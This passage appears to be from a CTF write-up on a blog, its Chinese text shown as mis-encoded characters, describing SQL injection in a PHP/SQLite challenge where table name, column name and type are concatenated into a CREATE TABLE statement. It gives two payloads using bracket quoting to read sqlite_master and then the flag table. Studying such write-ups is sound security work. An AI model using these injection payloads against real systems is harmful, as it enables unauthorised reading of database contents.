                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">INTEGER</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REAL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">REAL</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TEXT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>`<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>æœ‰äº†æºç ï¼Œé€»è¾‘å°±æ¸…æ™°äº†è®¸å¤šï¼Œæºç ä¸­æœ‰flagè¡¨åˆ›å»ºå’Œæ’å…¥flagçš„æ“ä½œï¼Œå¯ä»¥ç¡®å®šflagå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œä½†æ˜¯å¯¹äºè¡¨åå’Œflagå€¼éƒ½æ˜¯åœ¨å¼€å§‹åŒ…å«è¿›æ¥çš„config.phpé‡Œå®šä¹‰çš„ã€‚</p>
<p>åœ¨æºç ä¸­çš„åˆ›å»ºè¡¨ç›¸å…³ä»£ç å¯ä»¥å‘ç°ï¼Œåˆ›å»ºè¡¨æ—¶è¡¨åï¼Œåˆ—åï¼Œåˆ—ç±»å‹å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>çœ‹ä¸€ä¸‹æœ€ç»ˆæ‹¼æ¥åçš„sqlè¯­å¥ï¼š</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> {$tName} <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>$<span class="token keyword">column</span><span class="token punctuation">`</span> $<span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<blockquote>
<p>sqlite_masterè¡¨æ˜¯SQLiteçš„ç³»ç»Ÿè¡¨ã€‚è¯¥è¡¨è®°å½•è¯¥æ•°æ®åº“ä¸­ä¿å­˜çš„è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å’Œè§¦å‘å™¨ä¿¡æ¯ã€‚æ¯ä¸€è¡Œè®°å½•ä¸€ä¸ªé¡¹ç›®ã€‚åœ¨åˆ›å»ºä¸€ä¸ªSQLIteæ•°æ®åº“çš„æ—¶å€™ï¼Œè¯¥è¡¨ä¼šè‡ªåŠ¨åˆ›å»ºã€‚sqlite_masterè¡¨åŒ…å«5åˆ—ã€‚</p>
<ul>
<li><p>typeåˆ—è®°å½•äº†é¡¹ç›®çš„ç±»å‹ï¼Œå¦‚tableã€indexã€viewã€triggerã€‚</p>
</li>
<li><p>nameåˆ—è®°å½•äº†é¡¹ç›®çš„åç§°ï¼Œå¦‚è¡¨åã€ç´¢å¼•åç­‰ã€‚</p>
</li>
<li><p>tbl_nameåˆ—è®°å½•æ‰€ä»å±çš„è¡¨åï¼Œå¦‚ç´¢å¼•æ‰€åœ¨çš„è¡¨åã€‚å¯¹äºè¡¨æ¥è¯´ï¼Œè¯¥åˆ—å°±æ˜¯è¡¨åæœ¬èº«ã€‚</p>
</li>
<li><p>rootpageåˆ—è®°å½•é¡¹ç›®åœ¨æ•°æ®åº“é¡µä¸­å­˜å‚¨çš„ç¼–å·ã€‚å¯¹äºè§†å›¾å’Œè§¦å‘å™¨ï¼Œè¯¥åˆ—å€¼ä¸º0æˆ–è€…NULLã€‚</p>
</li>
<li><p>sqlåˆ—è®°å½•åˆ›å»ºè¯¥é¡¹ç›®çš„SQLè¯­å¥ã€‚</p>
</li>
</ul>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036081405146.jpg" alt="16036081405146"></p>
</blockquote>
<p>é‚£æˆ‘ä»¬åªæœ‰åªè¦æƒ³åŠæ³•æŸ¥sqlite_masterè¡¨å°±çŸ¥é“flagè¡¨å’Œå¯¹åº”çš„å­—æ®µåã€‚ç»“åˆä¸Šé¢çš„sqlè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼ï¼š</p>
<pre><code>create table aa as select xxx from xxx</code></pre><p>åŒæ—¶å‚æ•°è¿˜ç»è¿‡äº†filterå‡½æ•°çš„å¤„ç†ï¼Œè¢«æ£€æµ‹åˆ°å°±æ˜¾ç¤ºè¡¨åéæ³•ã€‚</p>
<p>é‚£ä¹ˆé€šè¿‡è¡¨åï¼Œåˆ—åå’Œç±»å‹ä¸‰ä¸ªåœ°æ–¹ä¼ å…¥payloadï¼Œæ¥æ‹¼æ¥å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„è¯­å¥ã€‚</p>
<p>ä½†æ˜¯å‘ç°åœ¨tbnameåè¿˜æ‹¼æ¥äº†ä¸€äº›å†…å®¹ä¼šé€ æˆå¹²æ‰°ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ åå¼•å· æŠŠå®ƒåŒ…è£¹èµ·æ¥ï¼Œå› ä¸ºåŒ…è£¹èµ·æ¥çš„å†…å®¹å°±æˆä¸ºäº†å…³é”®å­—ï¼Œå°±ç›¸</p>
<p>äº <code>select xx as key</code>,çœ‹ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036088629436.jpg" alt="16036088629436"></p>
<p>åŒæ—¶åå¼•å·å¯ä»¥ä½¿ç”¨<code>[]</code>æ¥æ›¿ä»£ç»•è¿‡è¿‡æ»¤ã€‚</p>
<p>payload1:</p>
<pre><code>åœ¨åˆ›å»ºè¡¨æ—¶ï¼Œè¡¨å: t AS SELECT sql [
åˆ—å: abc
åˆ—ç±»å‹: ] FROM sqlite_master;</code></pre><p>è¿™æ—¶çš„sqlè¯­å¥å°±æ˜¯ï¼š</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token punctuation">[</span> <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token number">abc</span> <span class="token punctuation">]</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>ç­‰ä»·äº</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036091121226.jpg" alt="16036091121226"></p>
<p>å¾—åˆ°äº†è¡¨åå’Œåˆ—åï¼Œæ›¿æ¢è¯­å¥ä¸­çš„sqlå’Œsqlite_master å³å¯è·å¾—flagï¼š</p>
<p>payload2:</p>
<pre><code>t AS SELECT flag_ThE_C0lumn [
abc
]FROM flag_Y0U_c4nt_GUESS;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036091570801.jpg" alt="16036091570801"></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
</search>
